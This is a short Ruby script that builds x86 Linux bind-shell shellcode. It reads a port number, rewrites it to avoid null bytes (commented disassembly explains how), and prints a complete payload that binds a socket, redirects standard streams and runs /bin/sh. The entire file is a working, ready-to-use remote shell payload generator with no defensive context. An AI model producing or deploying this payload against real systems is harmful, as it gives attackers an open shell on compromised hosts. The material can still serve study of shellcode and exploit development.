#!/usr/bin/ruby


SHELLCODE_PART1="\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xd2\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x02\\x59\\x52\\xe2\\xfd\\x52"

#if there's no zero byte:
#66 68 20 fb          	pushw  0xfb20
#if there's zero byte:
##0x0000: reject
##0x0001-0x00FF=>0x0101-0x01ff, sub 0x0100
# 8048060:	66 68 ff 01          	pushw  0x1ff
# 8048064:	66 5a                  	pop    dx
# 8048065:	80 ee 01          	sub    dh,0x1
# 8048069:	66 52                  	push   dx
# 804806a:	31 d2                	xor    edx,edx

##0x0100-0xFF00=>0x0101-0xff01, sub 0x0001
# 8048060:	66 68 01 ff          	pushw  0xff01
# 8048064:	66 5a                  	pop    dx
# 8048065:	83 ea 01             	sub    edx,0x1
# 8048068:	66 52                  	push   dx
# 8048069:	31 d2                	xor    edx,edx


SHELLCODE_PART2="\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x6a\\x66\\x58\\x43\\xcd\\x80\\x6a\\x66\\x58\\x83\\xc3\\x02\\x6a\\x01\\x56\\x89\\xe1\\xcd\\x80\\x6a\\x66\\x58\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x6a\\x3f\\x58\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x6a\\x3f\\x58\\x41\\xcd\\x80\\x6a\\x3f\\x58\\x41\\xcd\\x80\\x6a\\x0b\\x58\\x31\\xc9\\x89\\xca\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\xcd\\x80"

part_port=""

print "Input the port for bindshell:\n"
sport=gets.chomp
if !/\A\d+\z/.match(sport) then
    print "not a good number\n"
    exit(1)
elsif sport.to_i <1 || sport.to_i >65535
    print "not a legal number\n"
    exit(1)
end

port=sport.to_i
hport="%04x" % port

if hport=~/[0-9a-f][0-9a-f]00/ then
    print "proceding to avoid lower zero\n"
    wport=port+1
    #lower byte
    lwport="%02x" % (wport & 0x00FF)
    #higher byte
    hwport="%02x" % ((wport & 0xFF00)>>8)
    part_port="\\x66\\x68"+"\\x"+hwport+"\\x"+lwport+"\\x66\\x5a\\x83\\xea\\x01\\x66\\x52\\x31\\xd2"
elsif port<=255
    print "proceding to avoid higher zero\n"
    wport=port+0x0100
    #lower byte
    lwport="%02x" % (wport & 0x00FF)
    #higher byte
    hwport="%02x" % ((wport & 0xFF00)>>8)
    part_port="\\x66\\x68"+"\\x"+hwport+"\\x"+lwport+"\\x66\\x5a\\x80\\xee\\x01\\x66\\x52\\x31\\xd2"
else
    print "proceding normal\n"
    #lower byte
    lwport="%02x" % (port & 0x00FF)
    #higher byte
    hwport="%02x" % ((port & 0xFF00)>>8)
    part_port="\\x66\\x68"+"\\x"+hwport+"\\x"+lwport
end

print SHELLCODE_PART1+part_port+SHELLCODE_PART2+"\n"
